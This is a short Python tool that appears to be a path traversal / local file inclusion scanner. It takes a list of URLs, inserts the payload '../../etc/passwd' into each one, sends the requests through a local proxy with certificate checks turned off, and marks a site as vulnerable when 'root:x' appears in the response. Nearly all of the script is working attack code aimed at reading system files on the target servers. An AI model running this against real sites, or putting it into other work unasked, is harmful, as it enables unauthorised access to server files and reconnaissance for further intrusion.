#!/usr/bin/python3 
import exurl
import sys
import requests
from termcolor import colored
from tqdm import tqdm
user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
proxies = {"http": "http://127.0.0.1:8080"}
file = sys.argv[1]
payload = "../../etc/passwd"
def split_file(file, payload):
    with open(file, 'r') as links:
        splitting_urls = exurl.split_urls(links, payload)
        return splitting_urls
def send_request(line):
    line = line.rstrip()
    headers = {"User-Agent": user_agent}
    try:
        r = requests.get(line, headers=headers, proxies=proxies, verify=False, timeout=15)
        content = r.content
        if b"root:x" in content:
            print(colored("\n\n[+] Vulnerable :> ", 'red') + line + "\n")
    except KeyboardInterrupt:
        exit()
    except Exception as error:
        print(line, error)
#calling splitting functions
splitted_urls = split_file(file, payload)
array_length = len(splitted_urls)
#start progress bar with calling execution functino
for i in tqdm(range(array_length), desc="Loading...", ascii=False, ncols=75):
    line = splitted_urls[i]
    send_request(line)
print(colored("\nEslam! We have finished\n", "green", attrs=['bold']))
